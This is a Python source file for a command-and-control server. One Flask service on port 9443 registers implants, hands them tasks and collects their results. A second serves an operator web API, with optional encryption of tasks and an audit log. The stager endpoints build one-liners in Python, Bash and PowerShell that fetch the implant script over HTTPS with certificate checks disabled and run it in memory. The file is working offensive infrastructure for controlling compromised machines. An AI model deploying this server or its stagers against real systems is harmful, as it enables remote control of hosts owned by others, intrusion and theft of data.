#!/usr/bin/python3

# Purpose: Beacon C2 Server — web UI edition.
#          Two Flask servers share in-memory + SQLite state:
#            port 9443 (mTLS)  — implant-facing
#            port 9444 (HTTPS) — operator web UI + REST API + SSE
# Author: Israel Fernandez
# Date of creation: April 9, 2026

import base64
import hashlib
import hmac
import json
import logging as _logging
import os
import queue as _queue
import sqlite3
import ssl
import threading
import uuid
from collections import defaultdict
from datetime import datetime, timezone

from flask import Flask, Response, jsonify, request, send_from_directory

# ── Silence Werkzeug request logs ─────────────────────────────────────────────
_logging.getLogger("werkzeug").setLevel(_logging.ERROR)

# ── Flask apps ─────────────────────────────────────────────────────────────────
app          = Flask(__name__)
operator_app = Flask("operator", static_folder=None)

# ── Shared in-memory state ─────────────────────────────────────────────────────
implants     = {}                   # {id: {hostname, user, os, registered, last_seen}}
task_queues  = defaultdict(list)    # {id: [pending tasks]}
result_store = defaultdict(list)    # {id: [undelivered results]}
task_counter = 0
task_counter_lock = threading.Lock()

# ── Cert / path constants ──────────────────────────────────────────────────────
_DIR    = os.path.dirname(os.path.abspath(__file__))
_TARGET = os.path.join(_DIR, "..", "Target")
CA_CERT    = os.path.join(_TARGET, "ca.crt")
SRV_CERT   = os.path.join(_TARGET, "target1.crt")
SRV_KEY    = os.path.join(_TARGET, "target1.key")
STATIC_DIR = os.path.join(_DIR, "static")
DB_PATH    = os.path.join(_DIR, "c2.db")

# ── HMAC-derived endpoint slugs ────────────────────────────────────────────────
ENDPOINT_KEY = b"41447568f68e1377515ec0dfa4bd5918a7dcbb5cad1a901ad708a3b7e49e273bf48e850784d094a2b1bb5f460a7a891221f96699c06a0705528afd3c0f2961fd"

def _derive_endpoints(key):
    def slug(label):
        return hmac.new(key, label.encode(), hashlib.sha256).hexdigest()[:16]
    return {"register": slug("register"), "tasks": slug("tasks"), "results": slug("results")}

ENDPOINT = _derive_endpoints(ENDPOINT_KEY)

# ── AES-GCM application-layer task/result encryption ──────────────────────────
# When ENCRYPT_TASKS=True the C2 wraps every task in an AES-GCM envelope so
# that a compromised TLS cert alone cannot reveal operator commands.
# Both sides derive the same 256-bit key from ENDPOINT_KEY.
ENCRYPT_TASKS = False   # toggle True to enable; implant auto-detects and mirrors

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
    import hashlib as _hl
    _ENC_KEY     = _hl.sha256(ENDPOINT_KEY + b"task-enc-v1").digest()
    _HAVE_CRYPTO = True
except ImportError:
    _HAVE_CRYPTO = False

def _enc(data: dict) -> dict:
    """Wrap dict in AES-GCM envelope. Noop if cryptography not installed."""
    if not _HAVE_CRYPTO or not ENCRYPT_TASKS:
        return data
    nonce = os.urandom(12)
    ct    = _AESGCM(_ENC_KEY).encrypt(nonce, json.dumps(data).encode(), None)
    return {"_enc": base64.b64encode(nonce + ct).decode()}

def _dec(data: dict) -> dict:
    """Decrypt a {"_enc": ...} envelope. Returns data unchanged if not encrypted."""
    if "_enc" not in data or not _HAVE_CRYPTO:
        return data
    blob      = base64.b64decode(data["_enc"])
    nonce, ct = blob[:12], blob[12:]
    pt        = _AESGCM(_ENC_KEY).decrypt(nonce, ct, None)
    return json.loads(pt)

# ── Multi-operator API key authentication ──────────────────────────────────────
# List of valid API keys. Empty list = auth disabled (default for local dev).
# Populate via env var:  export C2_API_KEYS="key1,key2"
OPERATOR_API_KEYS: list = [
    k.strip() for k in os.environ.get("C2_API_KEYS", "").split(",") if k.strip()
]

# ── Console helpers ────────────────────────────────────────────────────────────
class bcolors:
    OKGREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    OKCYAN  = '\033[96m'; ENDC    = '\033[0m';  BOLD  = '\033[1m'

def warn(msg):    print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC} {msg}")
def err(msg):     print(f"{bcolors.BOLD}{bcolors.FAIL}[!]{bcolors.ENDC} {msg}")
def success(msg): print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.ENDC} {msg}")
def log(msg):     print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")


# ── SQLite persistence ─────────────────────────────────────────────────────────
_db_conn = None
_db_lock = threading.Lock()

def _get_db():
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
    return _db_conn

def _init_db():
    with _db_lock:
        db = _get_db()
        db.executescript("""
            CREATE TABLE IF NOT EXISTS implants (
                id         TEXT PRIMARY KEY,
                hostname   TEXT,
                user       TEXT,
                os         TEXT,
                registered TEXT,
                last_seen  TEXT,
                notes      TEXT DEFAULT '',
                tags       TEXT DEFAULT '[]'
            );
            CREATE TABLE IF NOT EXISTS results (
                rowid       INTEGER PRIMARY KEY AUTOINCREMENT,
                implant_id  TEXT,
                task_id     INTEGER,
                type        TEXT,
                ok          INTEGER,
                data        TEXT,
                received_at TEXT,
                delivered   INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS audit_log (
                rowid       INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp   TEXT,
                implant_id  TEXT,
                action      TEXT,
                details     TEXT
            );
            -- Migration: add notes/tags columns if upgrading from older schema
            CREATE TABLE IF NOT EXISTS _migrations (key TEXT PRIMARY KEY);
        """)
        # Add columns to existing implants table if they don't exist yet
        try:
            db.execute("ALTER TABLE implants ADD COLUMN notes TEXT DEFAULT ''")
            db.commit()
        except Exception:
            pass
        try:
            db.execute("ALTER TABLE implants ADD COLUMN tags TEXT DEFAULT '[]'")
            db.commit()
        except Exception:
            pass
        db.commit()

def _db_upsert_implant(implant_id, info):
    with _db_lock:
        db = _get_db()
        db.execute(
            "INSERT OR REPLACE INTO implants "
            "(id, hostname, user, os, registered, last_seen, notes, tags) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (implant_id, info["hostname"], info["user"], info["os"],
             info["registered"], info["last_seen"],
             info.get("notes", ""), info.get("tags", "[]"))
        )
        db.commit()


def _db_load_implants():
    """Restore implant metadata (notes, tags) from SQLite on startup."""
    with _db_lock:
        db = _get_db()
        rows = db.execute(
            "SELECT id, hostname, user, os, registered, last_seen, notes, tags "
            "FROM implants"
        ).fetchall()
    for r in rows:
        iid = r["id"]
        if iid not in implants:
            implants[iid] = {
                "hostname":   r["hostname"],
                "user":       r["user"],
                "os":         r["os"],
                "registered": r["registered"],
                "last_seen":  r["last_seen"],
            }
        implants[iid]["notes"] = r["notes"] or ""
        implants[iid]["tags"]  = json.loads(r["tags"] or "[]")

def _db_update_last_seen(implant_id, ts):
    with _db_lock:
        db = _get_db()
        db.execute("UPDATE implants SET last_seen=? WHERE id=?", (ts, implant_id))
        db.commit()

def _db_store_result(implant_id, result):
    with _db_lock:
        db = _get_db()
        db.execute(
            "INSERT INTO results (implant_id, task_id, type, ok, data, received_at, delivered) "
            "VALUES (?, ?, ?, ?, ?, ?, 0)",
            (implant_id, result.get("task_id"), result.get("type"),
             1 if result.get("ok") else 0, json.dumps(result), result.get("received_at"))
        )
        db.commit()

def _db_audit(implant_id, action, details):
    with _db_lock:
        db = _get_db()
        db.execute(
            "INSERT INTO audit_log (timestamp, implant_id, action, details) VALUES (?, ?, ?, ?)",
            (datetime.now(timezone.utc).isoformat(), implant_id, action, json.dumps(details))
        )
        db.commit()


# ── Implant status ─────────────────────────────────────────────────────────────
def _implant_status(last_seen):
    """'online' (<60 s), 'idle' (<5 min), or 'offline'."""
    if not last_seen:
        return "offline"
    delta = (datetime.now(timezone.utc) -
             datetime.fromisoformat(last_seen)).total_seconds()
    if delta < 60:
        return "online"
    elif delta < 300:
        return "idle"
    return "offline"


# ── Task counter ───────────────────────────────────────────────────────────────
def _next_task_id():
    global task_counter
    with task_counter_lock:
        task_counter += 1
        return task_counter

def queue_task(implant_id, task_type, payload):
    task_id = _next_task_id()
    task = {"task_id": task_id, "type": task_type, **payload}
    task_queues[implant_id].append(task)
    _db_audit(implant_id, "task_queued", {"task_id": task_id, "type": task_type})
    log(f"Task #{task_id} ({task_type}) queued for {implant_id[:8]}...")
    return task_id


# ── SSE infrastructure ─────────────────────────────────────────────────────────
_sse_clients      = []
_sse_clients_lock = threading.Lock()

def _push_sse(event_type: str, data: dict):
    msg = f"event: {event_type}\ndata: {json.dumps(data)}\n\n"
    with _sse_clients_lock:
        for q in list(_sse_clients):
            try:
                q.put_nowait(msg)
            except _queue.Full:
                pass


# ── Implant-facing endpoints (port 9443, mTLS) ─────────────────────────────────

@app.post(f"/{ENDPOINT['register']}")
def register():
    data       = request.get_json()
    implant_id = data.get("id", str(uuid.uuid4()))
    now        = datetime.now(timezone.utc).isoformat()
    implants[implant_id] = {
        "hostname":   data.get("hostname", "unknown"),
        "user":       data.get("user",     "unknown"),
        "os":         data.get("os",       "unknown"),
        "registered": now,
        "last_seen":  now,
    }
    info = implants[implant_id]
    _db_upsert_implant(implant_id, info)
    _db_audit(implant_id, "implant_registered",
              {"hostname": info["hostname"], "user": info["user"], "os": info["os"]})
    success(f"Implant registered: {implant_id[:8]} ({info['user']}@{info['hostname']})")
    _push_sse("implant_registered", {"id": implant_id, **info, "status": "online"})
    return jsonify({"ok": True, "id": implant_id})


@app.get(f"/{ENDPOINT['tasks']}/<implant_id>")
def get_tasks(implant_id):
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    ts = datetime.now(timezone.utc).isoformat()
    implants[implant_id]["last_seen"] = ts
    _db_update_last_seen(implant_id, ts)
    if task_queues[implant_id]:
        task = task_queues[implant_id].pop(0)
        return jsonify({"ok": True, "task": _enc(task)})   # AES-GCM encrypt if enabled
    return jsonify({"ok": True, "task": None})


@app.post(f"/{ENDPOINT['results']}/<implant_id>")
def post_results(implant_id):
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    data = _dec(request.get_json())   # AES-GCM decrypt if encrypted by implant
    ts                = datetime.now(timezone.utc).isoformat()
    data["received_at"]               = ts
    implants[implant_id]["last_seen"] = ts
    result_store[implant_id].append(data)
    _db_update_last_seen(implant_id, ts)
    _db_store_result(implant_id, data)
    _db_audit(implant_id, "result_received",
              {"task_id": data.get("task_id"), "type": data.get("type"), "ok": data.get("ok")})
    info = implants[implant_id]
    _push_sse("new_results", {
        "implant_id": implant_id,
        "count":      len(result_store[implant_id]),
        "user":       info["user"],
        "hostname":   info["hostname"],
    })
    return jsonify({"ok": True})


# ── Operator REST API + SSE (port 9444, HTTPS) ─────────────────────────────────

@operator_app.after_request
def _cors(response):
    response.headers["Access-Control-Allow-Origin"]  = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, X-API-Key, Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PATCH, DELETE, OPTIONS"
    return response

@operator_app.route("/api/<path:path>", methods=["OPTIONS"])
def _options(path):
    return "", 204

@operator_app.before_request
def _auth_gate():
    """Enforce API key when OPERATOR_API_KEYS is non-empty. Stager/static paths are open."""
    if request.method == "OPTIONS":
        return None
    # Stager endpoints are intentionally unauthenticated (the point is to be served publicly)
    if request.path.startswith("/api/stage/") or not request.path.startswith("/api/"):
        return None
    if not OPERATOR_API_KEYS:
        return None   # auth disabled when no keys configured
    key = (request.headers.get("X-API-Key") or
           request.headers.get("Authorization", "").removeprefix("Bearer ").strip())
    if key in OPERATOR_API_KEYS:
        return None
    return jsonify({"error": "Unauthorized — provide valid X-API-Key header"}), 401


@operator_app.get("/api/implants")
def api_implants():
    out = []
    for iid, info in implants.items():
        out.append({
            "id":              iid,
            **info,
            "tags":            info.get("tags", []),
            "notes":           info.get("notes", ""),
            "status":          _implant_status(info.get("last_seen")),
            "pending_results": len(result_store.get(iid, [])),
            "pending_tasks":   len(task_queues.get(iid, [])),
        })
    return jsonify(out)


@operator_app.post("/api/task/<implant_id>")
def api_queue_task(implant_id):
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    data      = request.get_json()
    task_type = data.pop("type", None)
    if not task_type:
        return jsonify({"error": "missing 'type'"}), 400
    task_id = queue_task(implant_id, task_type, data)
    return jsonify({"ok": True, "task_id": task_id})


@operator_app.get("/api/results/<implant_id>")
def api_results(implant_id):
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    results = list(result_store[implant_id])
    result_store[implant_id].clear()
    return jsonify(results)


@operator_app.get("/api/results/<implant_id>/history")
def api_results_history(implant_id):
    """Paginated full result history from SQLite (never clears the store)."""
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    page     = max(1, int(request.args.get("page", 1)))
    per_page = min(100, int(request.args.get("per_page", 50)))
    offset   = (page - 1) * per_page
    with _db_lock:
        db    = _get_db()
        rows  = db.execute(
            "SELECT data FROM results WHERE implant_id=? "
            "ORDER BY rowid DESC LIMIT ? OFFSET ?",
            (implant_id, per_page, offset)
        ).fetchall()
        total = db.execute(
            "SELECT COUNT(*) FROM results WHERE implant_id=?",
            (implant_id,)
        ).fetchone()[0]
    results = [json.loads(r["data"]) for r in rows]
    return jsonify({"results": results, "total": total, "page": page, "per_page": per_page})


@operator_app.delete("/api/task/<implant_id>/<int:task_id>")
def api_cancel_task(implant_id, task_id):
    """Cancel a pending task that hasn't been picked up by the implant yet."""
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    before = len(task_queues.get(implant_id, []))
    task_queues[implant_id] = [
        t for t in task_queues.get(implant_id, [])
        if t.get("task_id") != task_id
    ]
    after = len(task_queues[implant_id])
    if before > after:
        _db_audit(implant_id, "task_cancelled", {"task_id": task_id})
        return jsonify({"ok": True, "cancelled": task_id})
    return jsonify({"error": "task not found or already delivered"}), 404


@operator_app.get("/api/task/<implant_id>/queue")
def api_task_queue(implant_id):
    """Return all tasks currently queued (not yet delivered) for an implant."""
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    return jsonify(list(task_queues.get(implant_id, [])))


@operator_app.patch("/api/implants/<implant_id>")
def api_update_implant(implant_id):
    """Update per-implant notes and/or tags."""
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    data = request.get_json() or {}
    updates = {}
    if "notes" in data:
        notes = str(data["notes"])
        implants[implant_id]["notes"] = notes
        updates["notes"] = notes
    if "tags" in data:
        tags = list(data["tags"]) if isinstance(data["tags"], list) else []
        implants[implant_id]["tags"] = tags
        updates["tags"] = tags
    if updates:
        with _db_lock:
            db = _get_db()
            if "notes" in updates:
                db.execute("UPDATE implants SET notes=? WHERE id=?",
                           (updates["notes"], implant_id))
            if "tags" in updates:
                db.execute("UPDATE implants SET tags=? WHERE id=?",
                           (json.dumps(updates["tags"]), implant_id))
            db.commit()
    return jsonify({"ok": True})


@operator_app.get("/api/audit")
def api_audit():
    """Last 200 audit entries, newest first."""
    with _db_lock:
        db   = _get_db()
        rows = db.execute(
            "SELECT timestamp, implant_id, action, details "
            "FROM audit_log ORDER BY rowid DESC LIMIT 200"
        ).fetchall()
    return jsonify([{
        "timestamp":  r["timestamp"],
        "implant_id": r["implant_id"],
        "action":     r["action"],
        "details":    json.loads(r["details"]),
    } for r in rows])


@operator_app.get("/api/audit/<implant_id>")
def api_audit_implant(implant_id):
    """Last 100 audit entries for one implant."""
    with _db_lock:
        db   = _get_db()
        rows = db.execute(
            "SELECT timestamp, implant_id, action, details "
            "FROM audit_log WHERE implant_id=? ORDER BY rowid DESC LIMIT 100",
            (implant_id,)
        ).fetchall()
    return jsonify([{
        "timestamp":  r["timestamp"],
        "implant_id": r["implant_id"],
        "action":     r["action"],
        "details":    json.loads(r["details"]),
    } for r in rows])


@operator_app.get("/api/stream")
def sse_stream():
    q = _queue.Queue(maxsize=100)
    with _sse_clients_lock:
        _sse_clients.append(q)

    def generate():
        try:
            yield "event: ping\ndata: {}\n\n"
            while True:
                try:
                    msg = q.get(timeout=30)
                    yield msg
                except _queue.Empty:
                    yield "event: ping\ndata: {}\n\n"
        finally:
            with _sse_clients_lock:
                try:
                    _sse_clients.remove(q)
                except ValueError:
                    pass

    return Response(
        generate(),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ── Payload staging ───────────────────────────────────────────────────────────
# Serve lightweight one-liner stagers so the operator can quickly drop an implant.
# The stager downloads implant_beacon.py and exec()s it in memory — never touches
# disk beyond what Python's import machinery requires.

@operator_app.get("/api/stage/implant")
def stage_implant():
    """Serve the raw implant script (fetched by stagers)."""
    return send_from_directory(_DIR, "implant_beacon.py", mimetype="text/plain")

@operator_app.get("/api/stage/python")
def stage_python():
    """One-liner Python stager: fetch implant over HTTPS and exec() it in-memory."""
    host = request.host.split(":")[0]
    stager = (
        f"python3 -c \""
        f"import urllib.request,ssl;"
        f"ctx=ssl.create_default_context();"
        f"ctx.check_hostname=False;"
        f"ctx.verify_mode=ssl.CERT_NONE;"
        f"exec(urllib.request.urlopen('https://{host}:9444/api/stage/implant',context=ctx).read())"
        f"\""
    )
    return stager, 200, {"Content-Type": "text/plain"}

@operator_app.get("/api/stage/sh")
def stage_sh():
    """Bash one-liner stager: curl + python3 pipeline."""
    host = request.host.split(":")[0]
    stager = f"curl -sk https://{host}:9444/api/stage/implant | python3"
    return stager, 200, {"Content-Type": "text/plain"}

@operator_app.get("/api/stage/ps1")
def stage_ps1():
    """PowerShell one-liner stager (Windows targets)."""
    host = request.host.split(":")[0]
    stager = (
        f"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};"
        f"$u='https://{host}:9444/api/stage/implant';"
        f"$code=(New-Object Net.WebClient).DownloadString($u);"
        f"python3 -c $code"
    )
    return stager, 200, {"Content-Type": "text/plain"}


# ── Encryption toggle ─────────────────────────────────────────────────────────

@operator_app.post("/api/config/encrypt")
def api_set_encrypt():
    """Enable or disable AES-GCM task/result encryption. Body: {\"enabled\": true}"""
    global ENCRYPT_TASKS
    data    = request.get_json() or {}
    enabled = bool(data.get("enabled", False))
    if enabled and not _HAVE_CRYPTO:
        return jsonify({"error": "cryptography package not installed on C2"}), 500
    ENCRYPT_TASKS = enabled
    return jsonify({"ok": True, "encrypt_tasks": ENCRYPT_TASKS,
                    "crypto_available": _HAVE_CRYPTO})

@operator_app.get("/api/config")
def api_get_config():
    """Return current C2 configuration."""
    return jsonify({
        "encrypt_tasks":   ENCRYPT_TASKS,
        "crypto_available": _HAVE_CRYPTO,
        "auth_enabled":    bool(OPERATOR_API_KEYS),
        "implant_count":   len(implants),
    })


# ── Static file serving ────────────────────────────────────────────────────────

@operator_app.get("/")
def index():
    return send_from_directory(STATIC_DIR, "index.html")

@operator_app.get("/assets/<path:filename>")
def assets(filename):
    return send_from_directory(os.path.join(STATIC_DIR, "assets"), filename)


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    _init_db()
    _db_load_implants()   # restore notes/tags from previous sessions

    implant_ssl = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    implant_ssl.load_cert_chain(SRV_CERT, SRV_KEY)
    implant_ssl.load_verify_locations(CA_CERT)
    implant_ssl.verify_mode = ssl.CERT_REQUIRED

    operator_ssl = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    operator_ssl.load_cert_chain(SRV_CERT, SRV_KEY)

    implant_thread = threading.Thread(
        target=lambda: app.run(
            host="0.0.0.0", port=9443, ssl_context=implant_ssl, use_reloader=False
        ),
        daemon=True,
    )
    implant_thread.start()

    success(f"Implant C2  → https://0.0.0.0:9443  (mTLS)")
    success(f"Operator UI → https://localhost:9444")

    operator_app.run(
        host="127.0.0.1", port=9444, ssl_context=operator_ssl, use_reloader=False
    )
